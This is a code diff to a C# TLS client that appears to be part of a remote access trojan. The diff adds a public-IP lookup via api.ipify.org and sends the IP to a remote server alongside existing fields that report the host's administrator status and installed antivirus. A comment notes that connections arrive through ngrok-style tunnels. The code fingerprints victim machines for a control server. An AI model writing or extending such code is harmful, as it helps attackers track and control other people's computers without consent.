@@ -1,5 +1,6 @@
 using System.Diagnostics;
 using System.IO;
+using System.Net.Http;
 using System.Net.Security;
 using System.Net.Sockets;
 using System.Security.Cryptography;
@@ -36,6 +37,19 @@ internal class TlsClient : IDisposable
     /// <summary>False after Disconnect/Uninstall — caller should NOT reconnect.</summary>
     public bool ShouldReconnect { get; private set; } = true;
 
+    // Shared HttpClient for public-IP lookup — one instance per process lifetime.
+    private static readonly HttpClient _ipHttp = new() { Timeout = TimeSpan.FromSeconds(4) };
+
+    private static async Task<string> FetchPublicIpAsync()
+    {
+        try
+        {
+            var ip = (await _ipHttp.GetStringAsync("https://api.ipify.org?format=text")).Trim();
+            return System.Net.IPAddress.TryParse(ip, out _) ? ip : string.Empty;
+        }
+        catch { return string.Empty; }
+    }
+
     public TlsClient(string host, int port)
     {
         _host = host;
@@ -56,6 +70,10 @@ internal class TlsClient : IDisposable
         _ssl = new SslStream(_tcp.GetStream(), false, ValidateServerCert);
         await _ssl.AuthenticateAsClientAsync(_host);
 
+        // Fetch real public IP before sending handshake so the server can display it
+        // correctly even when the connection comes through a tunnel (localtonet, ngrok, etc.)
+        var publicIp = await FetchPublicIpAsync();
+
         // Send client info with auth key
         ClientInfoData info;
         try
@@ -73,7 +91,8 @@ internal class TlsClient : IDisposable
                 IsAdmin = IsAdmin(),
                 Antivirus = GetAntivirus(),
                 IdPrefix = Config.ClientIdPrefix,
-                InstanceId = _instanceId
+                InstanceId = _instanceId,
+                IP = publicIp
             };
         }
         catch
